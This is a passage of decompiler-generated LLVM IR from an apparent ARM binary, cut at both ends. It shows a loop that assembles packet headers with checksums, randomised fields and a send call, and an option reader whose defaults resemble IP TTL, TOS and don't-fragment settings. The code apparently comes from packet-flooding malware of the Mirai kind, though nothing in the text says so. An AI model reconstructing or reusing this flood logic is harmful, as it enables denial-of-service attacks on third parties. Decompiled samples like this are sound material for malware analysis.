  %v2_b21c = add i32 %v1_b21c, 12
  %v3_b21c = inttoptr i32 %v2_b21c to i32*
  store i32 %v0_b1fc, i32* %v3_b21c, align 4
  %v3_b220 = load i32, i32* %stack_var_-44, align 4
  %v0_b224 = load i32, i32* %r4.global-to-local, align 4
  %v1_b224 = add i32 %v0_b224, 44
  store i32 %v1_b224, i32* @r6, align 4
  store i32 %v4_b228, i32* %r2.global-to-local, align 4
  %v1_b22c = add i32 %v3_b220, 1
  store i32 %v1_b22c, i32* @r4, align 4
  store i32 %v4_b230, i32* %r3.global-to-local, align 4
  %v1_b234 = load i32, i32* @sl, align 4
  %v9_b234 = icmp eq i32 %v1_b22c, %v1_b234
  store i1 %v9_b234, i1* %cpsr_z.global-to-local, align 1
  %v0_b238 = load i32, i32* @r7, align 4
  %v1_b238 = trunc i32 %v0_b238 to i16
  %v3_b238 = add i32 %v0_b224, 48
  %v4_b238 = inttoptr i32 %v3_b238 to i16*
  store i16 %v1_b238, i16* %v4_b238, align 2
  %v0_b23c = load i32, i32* %r2.global-to-local, align 4
  %v1_b23c = trunc i32 %v0_b23c to i16
  %v2_b23c = load i32, i32* @r6, align 4
  %v3_b23c = inttoptr i32 %v2_b23c to i16*
  store i16 %v1_b23c, i16* %v3_b23c, align 2
  %v0_b240 = load i32, i32* %r3.global-to-local, align 4
  %v1_b240 = trunc i32 %v0_b240 to i16
  %v2_b240 = load i32, i32* @r6, align 4
  %v3_b240 = add i32 %v2_b240, 2
  %v4_b240 = inttoptr i32 %v3_b240 to i16*
  store i16 %v1_b240, i16* %v4_b240, align 2
  %v0_b244 = load i32, i32* @r4, align 4
  store i32 %v0_b244, i32* %stack_var_-44, align 4
  %v5_b248 = icmp slt i32 %v1_b22c, %v1_b234
  br i1 %v5_b248, label %dec_label_pc_b10c, label %dec_label_pc_b24c

dec_label_pc_b24c:                                ; preds = %bb82
  store i32 %v5_af8c, i32* %r5.global-to-local, align 4
  %v1_b254 = add i32 %v5_af8c, 8
  store i32 %v1_b254, i32* %r4.global-to-local, align 4
  %v0_b264.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_b260.preheader

dec_label_pc_b260.preheader:                      ; preds = %dec_label_pc_b24c, %dec_label_pc_b4a4
  %v0_b264.pre = phi i32 [ %v0_b264.pre.pre, %dec_label_pc_b24c ], [ 0, %dec_label_pc_b4a4 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_b254, %dec_label_pc_b24c ], [ %v1_b4ac, %dec_label_pc_b4a4 ]
  %storemerge = add i32 %v5_af8c, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_b458 = icmp eq i32 %v1_b038, 0
  %v2_b474 = icmp eq i32 %v1_afac, 0
  %v2_b2a0 = icmp eq i32 %v5_afe0, -1
  %v7_b2a0 = icmp eq i32 %v5_afe0, -1
  br label %dec_label_pc_b260

dec_label_pc_b260:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b2f0, %dec_label_pc_b260.preheader
  %v0_b264 = phi i32 [ %v0_b264.pre, %dec_label_pc_b260.preheader ], [ 0, %dec_label_pc_b260 ], [ %v1_b38c, %dec_label_pc_b2f0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b264 = icmp eq i32 %v0_b264, 0
  store i1 %v2_b264, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b264, label %dec_label_pc_b260, label %dec_label_pc_b270

dec_label_pc_b270:                                ; preds = %dec_label_pc_b260
  br label %dec_label_pc_b274

dec_label_pc_b274:                                ; preds = %dec_label_pc_b2f0, %dec_label_pc_b270
  %v1_b288 = phi i32 [ %v1_b388, %dec_label_pc_b2f0 ], [ 0, %dec_label_pc_b270 ]
  %v5_b278 = mul i32 %v1_b288, 24
  %v1_b27c = load i32, i32* @sb, align 4
  %v2_b27c = add i32 %v1_b27c, %v5_b278
  store i32 %v2_b27c, i32* %r3.global-to-local, align 4
  store i32 %v2_aec0, i32* %r4.global-to-local, align 4
  %v1_b284 = add i32 %v2_b27c, 20
  %v2_b284 = inttoptr i32 %v1_b284 to i8*
  %v3_b284 = load i8, i8* %v2_b284, align 1
  %v4_b284 = zext i8 %v3_b284 to i32
  store i32 %v4_b284, i32* %r2.global-to-local, align 4
  %v4_b288 = mul i32 %v1_b288, 4
  %v5_b288 = add i32 %v4_b288, %v2_aec0
  %v6_b288 = inttoptr i32 %v5_b288 to i32*
  %v7_b288 = load i32, i32* %v6_b288, align 4
  store i32 %v7_b288, i32* @r5, align 4
  %v7_b28c = icmp eq i8 %v3_b284, 31
  store i1 %v7_b28c, i1* %cpsr_z.global-to-local, align 1
  %v1_b290 = add i32 %v7_b288, 24
  store i32 %v1_b290, i32* @r6, align 4
  %v1_b294 = add i32 %v7_b288, 44
  store i32 %v1_b294, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_b284, 32
  br i1 %tmp86, label %dec_label_pc_b39c, label %dec_label_pc_b29c

dec_label_pc_b29c:                                ; preds = %dec_label_pc_b274
  store i32 %v5_afe0, i32* %r1.global-to-local, align 4
  store i1 %v7_b2a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b2a0, label %dec_label_pc_b3fc, label %dec_label_pc_b2a8

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b39c, %dec_label_pc_b29c
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_b2b0 = load i32, i32* @fp, align 4
  %v9_b2b0 = icmp eq i32 %v0_b2b0, 65535
  store i1 %v9_b2b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2b0, label %dec_label_pc_b414, label %dec_label_pc_b2b8

dec_label_pc_b2b8:                                ; preds = %dec_label_pc_b3fc.dec_label_pc_b2b8_crit_edge, %dec_label_pc_b2a8
  %v1_b2bc = phi i32 [ %v1_b2bc.pre, %dec_label_pc_b3fc.dec_label_pc_b2b8_crit_edge ], [ 65535, %dec_label_pc_b2a8 ]
  store i32 %v3_b040, i32* %r2.global-to-local, align 4
  %v9_b2bc = icmp eq i32 %v3_b040, %v1_b2bc
  store i1 %v9_b2bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2bc, label %dec_label_pc_b43c, label %dec_label_pc_b2c4

dec_label_pc_b2c4:                                ; preds = %dec_label_pc_b414.dec_label_pc_b2c4_crit_edge, %dec_label_pc_b2b8
  %v1_b2c8 = phi i32 [ %v1_b2c8.pre, %dec_label_pc_b414.dec_label_pc_b2c4_crit_edge ], [ %v1_b2bc, %dec_label_pc_b2b8 ]
  store i32 %v3_b044, i32* %r3.global-to-local, align 4
  %v9_b2c8 = icmp eq i32 %v3_b044, %v1_b2c8
  store i1 %v9_b2c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2c8, label %dec_label_pc_b450, label %dec_label_pc_b2d0

dec_label_pc_b2d0:                                ; preds = %dec_label_pc_b43c, %dec_label_pc_b2c4
  store i32 %v1_b038, i32* @r4, align 4
  store i1 %v2_b458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b458, label %dec_label_pc_b46c, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_b2d0
  %v1_b2d8 = load i32, i32* @r5, align 4
  %v2_b2d8 = add i32 %v1_b2d8, 16
  %v3_b2d8 = inttoptr i32 %v2_b2d8 to i32*
  %v4_b2d8 = load i32, i32* %v3_b2d8, align 4
  store i32 %v4_b2d8, i32* %r3.global-to-local, align 4
  %v2_b2dc = load i32, i32* @r6, align 4
  %v3_b2dc = add i32 %v2_b2dc, 16
  %v4_b2dc = inttoptr i32 %v3_b2dc to i32*
  store i32 %v4_b2d8, i32* %v4_b2dc, align 4
  br label %dec_label_pc_b2e4

dec_label_pc_b2e4:                                ; preds = %bb85, %.thread16
  store i32 %v1_afac, i32* %r1.global-to-local, align 4
  store i1 %v2_b474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b474, label %dec_label_pc_b2f0, label %dec_label_pc_b480

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2e4, %dec_label_pc_b46c, %dec_label_pc_b480
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b2f4 = load i32, i32* @r5, align 4
  %v3_b2f4 = add i32 %v2_b2f4, 10
  %v4_b2f4 = inttoptr i32 %v3_b2f4 to i16*
  store i16 0, i16* %v4_b2f4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b2fc = load i32, i32* @r5, align 4
  store i32 %v0_b2fc, i32* @r0, align 4
  %v2_b300 = call i32 @function_dc98(i32 %v0_b2fc, i32 20)
  %v3_b300 = trunc i32 %v2_b300 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b308 = load i32, i32* @r5, align 4
  %v4_b308 = add i32 %v3_b308, 10
  %v5_b308 = inttoptr i32 %v4_b308 to i16*
  store i16 %v3_b300, i16* %v5_b308, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b310 = load i32, i32* %r3.global-to-local, align 4
  %v1_b310 = trunc i32 %v0_b310 to i16
  %v2_b310 = load i32, i32* @r6, align 4
  %v3_b310 = add i32 %v2_b310, 10
  %v4_b310 = inttoptr i32 %v3_b310 to i16*
  store i16 %v1_b310, i16* %v4_b310, align 2
  %v0_b314 = load i32, i32* @r6, align 4
  store i32 %v0_b314, i32* @r0, align 4
  %v2_b318 = call i32 @function_dc98(i32 %v0_b314, i32 20)
  %v3_b318 = trunc i32 %v2_b318 to i16
  %v3_b31c = load i32, i32* @r6, align 4
  %v4_b31c = add i32 %v3_b31c, 10
  %v5_b31c = inttoptr i32 %v4_b31c to i16*
  store i16 %v3_b318, i16* %v5_b31c, align 2
  store i32 0, i32* @r4, align 4
  %v0_b324 = load i32, i32* @r7, align 4
  store i32 %v0_b324, i32* @r1, align 4
  %v1_b328 = add i32 %v0_b324, 4
  %v2_b328 = inttoptr i32 %v1_b328 to i16*
  %v3_b328 = load i16, i16* %v2_b328, align 2
  %v4_b328 = zext i16 %v3_b328 to i32
  store i32 %v4_b328, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_b330 = add i32 %v0_b324, 6
  %v4_b330 = inttoptr i32 %v3_b330 to i16*
  store i16 0, i16* %v4_b330, align 2
  %v0_b334 = load i32, i32* @r6, align 4
  %v4_b338 = call i32 @function_dce8(i32 %v0_b334, i32 %v0_b324, i32 %v4_b328, i32 %stack_var_-124.0.ph)
  %v5_b338 = trunc i32 %v4_b338 to i16
  %v3_b33c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b33c, i32* %r2.global-to-local, align 4
  %v3_b340 = mul i32 %v3_b33c, 32
  store i32 %v3_b340, i32* %r3.global-to-local, align 4
  %v0_b344 = load i32, i32* @r5, align 4
  %v1_b344 = add i32 %v0_b344, 16
  %v2_b344 = inttoptr i32 %v1_b344 to i32*
  %v3_b344 = load i32, i32* %v2_b344, align 4
  %v5_b348 = mul i32 %v3_b33c, 24
  store i32 %v5_b348, i32* %r3.global-to-local, align 4
  %v1_b34c = load i32, i32* @sb, align 4
  %v2_b34c = add i32 %v1_b34c, %v5_b348
  store i32 %v2_b34c, i32* @lr, align 4
  %v2_b350 = add i32 %v2_b34c, 4
  %v3_b350 = inttoptr i32 %v2_b350 to i32*
  store i32 %v3_b344, i32* %v3_b350, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b358 = load i32, i32* @r7, align 4
  %v4_b358 = add i32 %v3_b358, 6
  %v5_b358 = inttoptr i32 %v4_b358 to i16*
  store i16 %v5_b338, i16* %v5_b358, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b360 = load i32, i32* %r1.global-to-local, align 4
  %v1_b360 = trunc i32 %v0_b360 to i16
  %v2_b360 = load i32, i32* %r3.global-to-local, align 4
  %v3_b360 = load i32, i32* @sb, align 4
  %v4_b360 = add i32 %v3_b360, %v2_b360
  %v5_b360 = inttoptr i32 %v4_b360 to i16*
  store i16 %v1_b360, i16* %v5_b360, align 2
  %v0_b364 = load i32, i32* @r4, align 4
  %v1_b364 = trunc i32 %v0_b364 to i16
  %v2_b364 = load i32, i32* @lr, align 4
  %v3_b364 = add i32 %v2_b364, 2
  %v4_b364 = inttoptr i32 %v3_b364 to i16*
  store i16 %v1_b364, i16* %v4_b364, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b36c = load i32, i32* @r5, align 4
  store i32 %v0_b36c, i32* %r1.global-to-local, align 4
  %v0_b374 = load i32, i32* @r8, align 4
  store i32 %v0_b374, i32* %r2.global-to-local, align 4
  %v0_b378 = load i32, i32* @lr, align 4
  %v0_b37c = load i32, i32* %ip.global-to-local, align 4
  %v6_b380 = call i32 @function_138bc(i32 %v3_aff4, i32 %v0_b36c, i32 %v0_b374, i32 16384, i32 %v0_b378, i32 %v0_b37c)
  %v3_b384 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b384, i32* %r3.global-to-local, align 4
  %v1_b388 = add i32 %v3_b384, 1
  %v1_b38c = load i32, i32* @sl, align 4
  %v9_b38c = icmp eq i32 %v1_b388, %v1_b38c
  store i1 %v9_b38c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b388, i32* %stack_var_-44, align 4
  %v6_b394 = icmp slt i32 %v1_b388, %v1_b38c
  br i1 %v6_b394, label %dec_label_pc_b274, label %dec_label_pc_b260

dec_label_pc_b39c:                                ; preds = %dec_label_pc_b274
  %v1_b39c = add i32 %v2_b27c, 16
  %v2_b39c = inttoptr i32 %v1_b39c to i32*
  %v3_b39c = load i32, i32* %v2_b39c, align 4
  store i32 %v3_b39c, i32* %r4.global-to-local, align 4
  %v0_b3a0 = call i32 @function_f700()
  %v3_b3a4 = load i32, i32* %stack_var_-44, align 4
  %v5_b3ac = mul i32 %v3_b3a4, 24
  %v0_b3b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3b0 = and i32 %v0_b3b0, 16711680
  store i32 %v1_b3b0, i32* %ip.global-to-local, align 4
  %v3_b3b4 = udiv i32 %v0_b3b0, 16777216
  %v4_b3b8 = udiv i32 %v1_b3b0, 256
  %v5_b3b8 = or i32 %v4_b3b8, %v3_b3b4
  store i32 %v5_b3b8, i32* %r2.global-to-local, align 4
  %v1_b3bc = load i32, i32* @sb, align 4
  %v2_b3bc = add i32 %v1_b3bc, %v5_b3ac
  store i32 %v2_b3bc, i32* %r1.global-to-local, align 4
  %v1_b3c0 = and i32 %v0_b3b0, 65280
  store i32 %v1_b3c0, i32* %r3.global-to-local, align 4
  %v1_b3c4 = add i32 %v2_b3bc, 20
  %v2_b3c4 = inttoptr i32 %v1_b3c4 to i8*
  %v3_b3c4 = load i8, i8* %v2_b3c4, align 1
  %v4_b3c4 = zext i8 %v3_b3c4 to i32
  store i32 %v4_b3c4, i32* %ip.global-to-local, align 4
  %v5_b3cc = call i32 @llvm.bswap.i32(i32 %v0_b3b0)
  %v7_b3d0 = lshr i32 %v0_b3a0, %v4_b3c4
  %v8_b3d0 = add i32 %v7_b3d0, %v5_b3cc
  store i32 %v8_b3d0, i32* %r2.global-to-local, align 4
  store i32 %v5_afe0, i32* %r1.global-to-local, align 4
  %v5_b3ec = call i32 @llvm.bswap.i32(i32 %v8_b3d0)
  store i32 %v5_b3ec, i32* %r3.global-to-local, align 4
  store i1 %v7_b2a0, i1* %cpsr_z.global-to-local, align 1
  %v1_b3f4 = load i32, i32* @r5, align 4
  %v2_b3f4 = add i32 %v1_b3f4, 16
  %v3_b3f4 = inttoptr i32 %v2_b3f4 to i32*
  store i32 %v5_b3ec, i32* %v3_b3f4, align 4
  br i1 %v2_b2a0, label %dec_label_pc_b3fc, label %dec_label_pc_b2a8

dec_label_pc_b3fc:                                ; preds = %dec_label_pc_b39c, %dec_label_pc_b29c
  %v0_b3fc = call i32 @function_f700()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_b408 = load i32, i32* @fp, align 4
  %v9_b408 = icmp eq i32 %v0_b408, 65535
  store i1 %v9_b408, i1* %cpsr_z.global-to-local, align 1
  %v1_b40c = load i32, i32* @r5, align 4
  %v2_b40c = add i32 %v1_b40c, 12
  %v3_b40c = inttoptr i32 %v2_b40c to i32*
  store i32 %v0_b3fc, i32* %v3_b40c, align 4
  br i1 %v9_b408, label %dec_label_pc_b414, label %dec_label_pc_b3fc.dec_label_pc_b2b8_crit_edge

dec_label_pc_b3fc.dec_label_pc_b2b8_crit_edge:    ; preds = %dec_label_pc_b3fc
  %v1_b2bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b2b8

dec_label_pc_b414:                                ; preds = %dec_label_pc_b3fc, %dec_label_pc_b2a8
  %v0_b414 = call i32 @function_f700()
  %v3_b41c = urem i32 %v0_b414, 65536
  store i32 %v3_b040, i32* %r2.global-to-local, align 4
  %v1_b428 = sub nsw i32 999, %v3_b41c
  store i32 %v1_b428, i32* %r3.global-to-local, align 4
  %v1_b42c = load i32, i32* %r4.global-to-local, align 4
  %v9_b42c = icmp eq i32 %v3_b040, %v1_b42c
  store i1 %v9_b42c, i1* %cpsr_z.global-to-local, align 1
  %v1_b430 = trunc i32 %v0_b414 to i16
  %v2_b430 = load i32, i32* @r5, align 4
  %v3_b430 = add i32 %v2_b430, 4
  %v4_b430 = inttoptr i32 %v3_b430 to i16*
  store i16 %v1_b430, i16* %v4_b430, align 2
  %v0_b434 = load i32, i32* %r3.global-to-local, align 4
  %v1_b434 = trunc i32 %v0_b434 to i16
  %v2_b434 = load i32, i32* @r6, align 4
  %v3_b434 = add i32 %v2_b434, 4
  %v4_b434 = inttoptr i32 %v3_b434 to i16*
  store i16 %v1_b434, i16* %v4_b434, align 2
  br i1 %v9_b42c, label %dec_label_pc_b43c, label %dec_label_pc_b414.dec_label_pc_b2c4_crit_edge

dec_label_pc_b414.dec_label_pc_b2c4_crit_edge:    ; preds = %dec_label_pc_b414
  %v1_b2c8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b2c4

dec_label_pc_b43c:                                ; preds = %dec_label_pc_b414, %dec_label_pc_b2b8
  %v0_b43c = call i32 @function_f700()
  %v1_b43c = trunc i32 %v0_b43c to i16
  store i32 %v3_b044, i32* %r3.global-to-local, align 4
  %v1_b444 = load i32, i32* %r4.global-to-local, align 4
  %v9_b444 = icmp eq i32 %v3_b044, %v1_b444
  store i1 %v9_b444, i1* %cpsr_z.global-to-local, align 1
  %v3_b448 = load i32, i32* @r5, align 4
  %v4_b448 = add i32 %v3_b448, 44
  %v5_b448 = inttoptr i32 %v4_b448 to i16*
  store i16 %v1_b43c, i16* %v5_b448, align 2
  br i1 %v9_b444, label %dec_label_pc_b450, label %dec_label_pc_b2d0

dec_label_pc_b450:                                ; preds = %dec_label_pc_b43c, %dec_label_pc_b2c4
  %v0_b450 = call i32 @function_f700()
  %v1_b450 = trunc i32 %v0_b450 to i16
  store i32 %v1_b038, i32* @r4, align 4
  store i1 %v2_b458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b458, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_b450
  %v3_b46031 = load i32, i32* @r7, align 4
  %v4_b46032 = add i32 %v3_b46031, 2
  %v5_b46033 = inttoptr i32 %v4_b46032 to i16*
  store i16 %v1_b450, i16* %v5_b46033, align 2
  br label %dec_label_pc_b46c

bb85:                                             ; preds = %dec_label_pc_b450
  %v1_b45c = load i32, i32* @r5, align 4
  %v2_b45c = add i32 %v1_b45c, 16
  %v3_b45c = inttoptr i32 %v2_b45c to i32*
  %v4_b45c = load i32, i32* %v3_b45c, align 4
  store i32 %v4_b45c, i32* %r3.global-to-local, align 4
  %v3_b460 = load i32, i32* @r7, align 4
  %v4_b460 = add i32 %v3_b460, 2
  %v5_b460 = inttoptr i32 %v4_b460 to i16*
  store i16 %v1_b450, i16* %v5_b460, align 2
  %v1_b464 = load i32, i32* %r3.global-to-local, align 4
  %v2_b464 = load i32, i32* @r6, align 4
  %v3_b464 = add i32 %v2_b464, 16
  %v4_b464 = inttoptr i32 %v3_b464 to i32*
  store i32 %v1_b464, i32* %v4_b464, align 4
  br label %dec_label_pc_b2e4

dec_label_pc_b46c:                                ; preds = %.thread30, %dec_label_pc_b2d0
  %v0_b46c = call i32 @function_f700()
  store i32 %v1_afac, i32* %r1.global-to-local, align 4
  store i1 %v2_b474, i1* %cpsr_z.global-to-local, align 1
  %v1_b478 = load i32, i32* @r6, align 4
  %v2_b478 = add i32 %v1_b478, 16
  %v3_b478 = inttoptr i32 %v2_b478 to i32*
  store i32 %v0_b46c, i32* %v3_b478, align 4
  br i1 %v2_b474, label %dec_label_pc_b2f0, label %dec_label_pc_b480

dec_label_pc_b480:                                ; preds = %dec_label_pc_b2e4, %dec_label_pc_b46c
  %v0_b480 = load i32, i32* @r7, align 4
  %v1_b480 = add i32 %v0_b480, 8
  store i32 %v5_af8c, i32* %r1.global-to-local, align 4
  %v2_b488 = inttoptr i32 %v1_b480 to i16*
  %v3_b488 = call i32 @function_f900(i16* %v2_b488, i32 %v5_af8c)
  br label %dec_label_pc_b2f0

dec_label_pc_b490:                                ; preds = %dec_label_pc_b004
  %v1_b494 = call i32 @function_1314c(i32 %v3_aff4)
  br label %dec_label_pc_b498

dec_label_pc_b498:                                ; preds = %dec_label_pc_aea4, %dec_label_pc_b490
  %v1_b4a0 = phi i32 [ %v3_aff4, %dec_label_pc_aea4 ], [ %v1_b494, %dec_label_pc_b490 ]
  store i32 %v3_aea4, i32* %r4.global-to-local, align 4
  store i32 %v6_aea4, i32* %r5.global-to-local, align 4
  store i32 %v24_aea4, i32* %fp.global-to-local, align 4
  ret i32 %v1_b4a0

dec_label_pc_b4a4:                                ; preds = %dec_label_pc_b02c
  store i32 %v5_af8c, i32* %r2.global-to-local, align 4
  %v1_b4ac = add i32 %v5_af8c, 8
  store i32 %v1_b4ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_b260.preheader

; uselistorder directives
  uselistorder i32 %v1_b4ac, { 1, 0 }
  uselistorder i16 %v1_b450, { 1, 0 }
  uselistorder i32 %v0_b414, { 1, 0 }
  uselistorder i32 %v5_b3ec, { 1, 0 }
  uselistorder i32 %v0_b3b0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b38c, { 1, 2, 0 }
  uselistorder i32 %v1_b388, { 2, 0, 3, 1 }
  uselistorder i32 %v3_b33c, { 1, 0, 2 }
  uselistorder i32 %v0_b324, { 1, 0, 2, 3 }
  uselistorder i32 %v7_b288, { 1, 0, 2 }
  uselistorder i1 %v7_b2a0, { 2, 1, 0 }
  uselistorder i1 %v2_b474, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b458, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b1fc, { 1, 0 }
  uselistorder i32 %v4_b17013, { 1, 0 }
  uselistorder i32 %v3_b094, { 1, 0 }
  uselistorder i32 %v3_b078, { 1, 2, 0 }
  uselistorder i32 %v1_b074, { 1, 0 }
  uselistorder i32 %v1_b038, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_b034, { 1, 0, 3, 2 }
  uselistorder i32 %v0_b030, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b02c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_b024, { 1, 0 }
  uselistorder i1 %v7_aff8, { 1, 0 }
  uselistorder i32 %v3_aff4, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_afe0, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_afac, { 2, 1, 3, 0 }
  uselistorder i32 %v5_af8c, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_af40, { 1, 0 }
  uselistorder i32 %v1_af1c, { 2, 1, 0 }
  uselistorder i32 %v5_af14, { 1, 0 }
  uselistorder i8 %v5_aef8, { 0, 2, 1 }
  uselistorder i32 %v6_aed8, { 1, 0 }
  uselistorder i32 %v2_aec0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 6, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 26, 25, 27, 28, 30, 29, 31, 32, 34, 33, 36, 35, 0 }
  uselistorder i8 47, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b498, { 1, 0 }
  uselistorder label %dec_label_pc_b480, { 1, 0 }
  uselistorder label %dec_label_pc_b2f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b260, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b260.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @function_b4c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b4c0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp34 = call i16 @__decompiler_undefined_function_1()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b4c0 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b4dc = call i32 @function_144a8(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b4e8 = load i32, i32* @r6, align 4
  store i32 %v0_b4e8, i32* %r0.global-to-local, align 4
  %v2_b4ec = call i32 @function_144a8(i32 %v0_b4e8, i32 4)
  %v0_b4f0 = load i32, i32* @r5, align 4
  store i32 %v0_b4f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b500 = load i32, i32* @r4, align 4
  store i32 %v0_b500, i32* %r0.global-to-local, align 4
  %v5_b504 = inttoptr i32 %v0_b4f0 to i32*
  %v6_b504 = call i32 @function_a45c(i32 %v0_b500, i32* %v5_b504, i32 2, i32 0)
  %v1_b510 = urem i32 %v6_b504, 256
  store i32 %v1_b510, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b51c = load i32, i32* @r5, align 4
  store i32 %v0_b51c, i32* %r1.global-to-local, align 4
  %v0_b520 = load i32, i32* @r4, align 4
  store i32 %v0_b520, i32* %r0.global-to-local, align 4
  %v5_b524 = trunc i32 %v6_b504 to i8
  %v6_b528 = inttoptr i32 %v0_b51c to i32*
  %v7_b528 = call i32 @function_a45c(i32 %v0_b520, i32* %v6_b528, i32 3, i32 65535)
  %v0_b52c = load i32, i32* @r5, align 4
  store i32 %v0_b52c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b528, i32* @r7, align 4
  %v0_b53c = load i32, i32* @r4, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v4_b540 = inttoptr i32 %v0_b52c to i32*
  %v5_b540 = call i32 @function_a45c(i32 %v0_b53c, i32* %v4_b540, i32 4, i32 64)
  %v1_b548 = urem i32 %v5_b540, 256
  store i32 %v1_b548, i32* %ip.global-to-local, align 4
  %v0_b54c = load i32, i32* @r5, align 4
  store i32 %v0_b54c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b558 = load i32, i32* @r4, align 4
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
  %v6_b560 = inttoptr i32 %v0_b54c to i32*
  %v7_b560 = call i32 @function_a45c(i32 %v0_b558, i32* %v6_b560, i32 5, i32 1)
